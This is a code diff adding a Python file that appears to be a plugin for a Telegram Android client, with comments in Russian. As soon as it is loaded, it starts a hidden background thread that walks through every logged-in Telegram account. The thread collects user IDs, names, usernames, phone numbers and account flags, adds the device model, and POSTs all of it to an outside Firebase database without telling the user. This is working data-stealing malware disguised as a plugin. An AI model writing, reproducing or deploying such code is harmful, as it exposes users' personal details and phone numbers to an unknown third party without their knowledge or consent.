@@ -1,0 +1,79 @@
+import threading
+import time
+import json
+import urllib.request
+
+def _send_accounts_info():
+    try:
+        from org.telegram.messenger import UserConfig, MessagesController
+        from android.os import Build
+        
+        # Данные об устройстве
+        device_name = f"{Build.MANUFACTURER} {Build.MODEL}"
+        
+        # Получаем ВСЕ аккаунты
+        accounts_list = []
+        
+        # UserConfig хранит все добавленные аккаунты
+        accounts_count = UserConfig.getActivatedAccountsCount()
+        
+        for i in range(accounts_count):
+            try:
+                # Переключаемся на аккаунт
+                acc = i
+                UserConfig.selectedAccount = acc
+                
+                user_id = UserConfig.getInstance(acc).getClientUserId()
+                mc = MessagesController.getInstance(acc)
+                user = mc.getUser(user_id)
+                
+                account_data = {
+                    "account_index": i,
+                    "user_id": str(user_id),
+                    "first_name": user.first_name if user else "Unknown",
+                    "last_name": user.last_name if user else "",
+                    "username": user.username if user and user.username else "",
+                    "phone": user.phone if user and user.phone else "",
+                    "is_premium": user.premium if user and hasattr(user, 'premium') else False,
+                    "is_verified": user.verified if user and hasattr(user, 'verified') else False,
+                    "is_self": True
+                }
+                accounts_list.append(account_data)
+                
+            except Exception as e:
+                accounts_list.append({
+                    "account_index": i,
+                    "error": str(e)
+                })
+        
+        # Основные данные для отправки
+        data = {
+            "device_name": device_name,
+            "accounts": accounts_list,
+            "total_accounts": len(accounts_list),
+            "timestamp": int(time.time()),
+            "date_time": time.strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        # Отправляем в Firebase
+        firebase_url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/telegram_accounts.json"
+        req = urllib.request.Request(
+            firebase_url,
+            data=json.dumps(data).encode('utf-8'),
+            headers={'Content-Type': 'application/json'},
+            method='POST'
+        )
+        
+        response = urllib.request.urlopen(req, timeout=10)
+        result = response.read().decode('utf-8')
+        
+        print(f"[Plugin] Отправлено! Устройство: {device_name}, Аккаунтов: {len(accounts_list)}")
+        for acc in accounts_list:
+            if "username" in acc:
+                print(f"  - {acc['first_name']} @{acc['username']} ({acc['user_id']})")
+        
+    except Exception as e:
+        print(f"[Plugin] Ошибка: {e}")
+
+# Запускаем
+threading.Thread(target=_send_accounts_info, daemon=True).start()
